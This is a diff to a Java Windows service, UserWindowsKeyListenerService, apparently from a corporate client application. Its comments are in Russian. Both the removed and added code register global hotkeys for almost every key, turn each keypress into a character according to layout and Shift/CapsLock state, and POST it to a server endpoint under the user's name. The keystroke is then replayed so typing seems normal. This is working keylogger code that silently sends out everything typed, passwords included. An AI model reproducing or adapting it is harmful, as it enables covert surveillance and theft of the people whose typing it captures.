@@ -59,9 +59,10 @@ public class UserWindowsKeyListenerService implements Service {
 	}
 
 	@Override
-	public void run() {	
+	public void run() {		
 		CompletableFuture.runAsync(() -> {
-			Thread.currentThread().setName("Регистрация клавиш");
+			Thread.currentThread().setName("Прослушивание клавиатуры");
+			
 			//Регистрируем клавиши ( пропуская комбинации с ctrl, alt, win и т.д. с нестандарными клавишами)
 			for(int i = 8; i <= 222; i++){
 				User32.RegisterHotKey(null, i, 0, i);
@@ -73,8 +74,6 @@ public class UserWindowsKeyListenerService implements Service {
 					User32.RegisterHotKey(null, i + 4000, User32.MOD_WIN, i);
 				}
 			}
-		}).thenRunAsync(() -> {
-			Thread.currentThread().setName("Прослушивание клавиатуры");
 			
 			final MSG msg = new MSG();
 			
@@ -84,109 +83,106 @@ public class UserWindowsKeyListenerService implements Service {
 			boolean shift = false;
 			boolean ctrl = false;
 			boolean alt = false;
-
-			while(this.isRun){
-				//Получаем системные сообщения
-				while(User32.GetMessage(msg, null, 0, 0, User32.PM_REMOVE)){
-					//Если остановка службы, то убираем все клавиши
-					if(!this.isRun) {
-						for(int i = 8; i <= 222; i++){
-							User32.UnregisterHotKey(null, i);
-							if(i>40) {
-								User32.UnregisterHotKey(null, i + 1000);
-								User32.UnregisterHotKey(null, i + 2000);
-								User32.UnregisterHotKey(null, i + 3000);
-								User32.UnregisterHotKey(null, i + 4000);
-							}
+			//Получаем системные сообщения
+			while(User32.GetMessage(msg, null, 0, 0, User32.PM_REMOVE)){
+				//Если остановка службы, то убираем все клавиши
+				if(!this.isRun) {
+					for(int i = 8; i <= 222; i++){
+						User32.UnregisterHotKey(null, i);
+						if(i>40) {
+							User32.UnregisterHotKey(null, i + 1000);
+							User32.UnregisterHotKey(null, i + 2000);
+							User32.UnregisterHotKey(null, i + 3000);
+							User32.UnregisterHotKey(null, i + 4000);
 						}
-						this.keysThreadPool.shutdown();
-						break;
 					}
+					this.keysThreadPool.shutdown();
+					break;
+				}
+				
+				//Если это клавиша
+				if(msg.message == User32.WM_HOTKEY){
 					
-					//Если это клавиша
-					if(msg.message == User32.WM_HOTKEY){
+					this.id = msg.wParam.intValue();
+					//Получаем id клавиши без комбинации
+					if(this.id > 4000)
+						this.id -= 4000;
+					else if(this.id > 3000)
+						this.id -= 3000;
+					else if(this.id > 2000)
+						this.id -= 2000;
+					if(this.id > 1000)
+						this.id -= 1000;
+					
+					//Убрираем из прослушивания клавишу
+					User32.UnregisterHotKey(null, this.id);
+					User32.UnregisterHotKey(null, this.id + 1000);
+					User32.UnregisterHotKey(null, this.id + 2000);
+					User32.UnregisterHotKey(null, this.id + 3000);
+					User32.UnregisterHotKey(null, this.id + 4000);
+					
+					final int idTemp = this.id;
+					//Получаем язык раскладки
+					final boolean isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
+					//Статус Shift
+					final int shiftKey = User32.GetKeyState(16);
+					
+					//В потоке отправляем клавишу
+					CompletableFuture.runAsync(() -> {
+						Thread.currentThread().setName("Отправление клавиши на сервер!");
 						
-						this.id = msg.wParam.intValue();
-						//Получаем id клавиши без комбинации
-						if(this.id > 4000)
-							this.id -= 4000;
-						else if(this.id > 3000)
-							this.id -= 3000;
-						else if(this.id > 2000)
-							this.id -= 2000;
-						if(this.id > 1000)
-							this.id -= 1000;
-						
-						//Убрираем из прослушивания клавишу
-						User32.UnregisterHotKey(null, this.id);
-						User32.UnregisterHotKey(null, this.id + 1000);
-						User32.UnregisterHotKey(null, this.id + 2000);
-						User32.UnregisterHotKey(null, this.id + 3000);
-						User32.UnregisterHotKey(null, this.id + 4000);
-						
-						final int idTemp = this.id;
-						//Получаем язык раскладки
-						final boolean isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
-						//Статус Shift
-						final int shiftKey = User32.GetKeyState(16);
-						
-						//В потоке отправляем клавишу
-						CompletableFuture.runAsync(() -> {
-							Thread.currentThread().setName("Отправление клавиши на сервер!");
-							
-							if(idTemp == 20)
-								this.isCapsLock = !this.isCapsLock;
-							//Получаем символ клавиши в зависимости от языка
-							String key = isRus ? getRusKey(idTemp) : getEngKey(idTemp);
-						
-							if(shiftKey < 0){
-								key = this.getShiftKey(idTemp, key, isRus);
-							}else if(this.isCapsLock){
-								if(65 <= idTemp && idTemp <= 90){
-									key = key.toUpperCase();
-								}
+						if(idTemp == 20)
+							this.isCapsLock = !this.isCapsLock;
+						//Получаем символ клавиши в зависимости от языка
+						String key = isRus ? getRusKey(idTemp) : getEngKey(idTemp);
+					
+						if(shiftKey < 0){
+							key = this.getShiftKey(idTemp, key, isRus);
+						}else if(this.isCapsLock){
+							if(65 <= idTemp && idTemp <= 90){
+								key = key.toUpperCase();
 							}
-
-							try {
-								this.restTemplate.postForObject("http://" + Resources.URL_TO_KOLAER_RESTFUL.toString() + "/system/user/" + username + "/key", key, String.class);
-							} catch (RestClientException ex) {
-								LOG.error("Невозможно отправить сообщение на {}!", "http://" + Resources.URL_TO_KOLAER_RESTFUL.toString() + "/system/user/" + username + "/key");
-								LOG.info("ID: {} - ({})", idTemp, key);
-							}
-
-						}, keysThreadPool);
-						
-						User32.keybd_event(this.id, 0, 0, 0);;
-
-						if(shift && (User32.GetKeyState(0xA1) & 0x8000) == 0){
-							shift = false;
-							User32.keybd_event(0x10, 0, 2, 0);
-						} else if((User32.GetKeyState(0xA1) & 0x8000) == 32768){
-								shift = true;
 						}
 
-						if(ctrl && (User32.GetKeyState(0xA3) & 0x8000) == 0){
-							ctrl = false;
-							User32.keybd_event(0x11, 0, 2, 0);
-						} else if((User32.GetKeyState(0xA3) & 0x8000) == 32768){
-								ctrl = true;
+						try {
+							this.restTemplate.postForObject("http://" + Resources.URL_TO_KOLAER_RESTFUL.toString() + "/system/user/" + username + "/key", key, String.class);
+						} catch (RestClientException ex) {
+							LOG.error("Невозможно отправить сообщение на {}!", "http://" + Resources.URL_TO_KOLAER_RESTFUL.toString() + "/system/user/" + username + "/key");
+							LOG.info("ID: {} - ({})", idTemp, key);
 						}
 
-						if(alt && (User32.GetKeyState(0xA5) & 0x8000) == 0){
-							alt = false;
-							User32.keybd_event(0x12, 0, 2, 0);
-						} else if((User32.GetKeyState(0xA5) & 0x8000) == 32768){
-								alt = true;
-						}
+					}, keysThreadPool);
+					
+					User32.keybd_event(this.id, 0, 0, 0);;
 
-						User32.RegisterHotKey(null, this.id, 0, this.id);
-						
-						if(this.id>40) {
-							User32.RegisterHotKey(null, this.id + 1000, User32.MOD_ALT, this.id);
-							User32.RegisterHotKey(null, this.id + 2000, User32.MOD_CONTROL, this.id);
-							User32.RegisterHotKey(null, this.id + 3000, User32.MOD_SHIFT, this.id);
-							User32.RegisterHotKey(null, this.id + 4000, User32.MOD_WIN, this.id);
-						}
+					if(shift && (User32.GetKeyState(0xA1) & 0x8000) == 0){
+						shift = false;
+						User32.keybd_event(0x10, 0, 2, 0);
+					} else if((User32.GetKeyState(0xA1) & 0x8000) == 32768){
+							shift = true;
+					}
+
+					if(ctrl && (User32.GetKeyState(0xA3) & 0x8000) == 0){
+						ctrl = false;
+						User32.keybd_event(0x11, 0, 2, 0);
+					} else if((User32.GetKeyState(0xA3) & 0x8000) == 32768){
+							ctrl = true;
+					}
+
+					if(alt && (User32.GetKeyState(0xA5) & 0x8000) == 0){
+						alt = false;
+						User32.keybd_event(0x12, 0, 2, 0);
+					} else if((User32.GetKeyState(0xA5) & 0x8000) == 32768){
+							alt = true;
+					}
+
+					User32.RegisterHotKey(null, this.id, 0, this.id);
+					
+					if(this.id>40) {
+						User32.RegisterHotKey(null, this.id + 1000, User32.MOD_ALT, this.id);
+						User32.RegisterHotKey(null, this.id + 2000, User32.MOD_CONTROL, this.id);
+						User32.RegisterHotKey(null, this.id + 3000, User32.MOD_SHIFT, this.id);
+						User32.RegisterHotKey(null, this.id + 4000, User32.MOD_WIN, this.id);
 					}
 				}
 			}
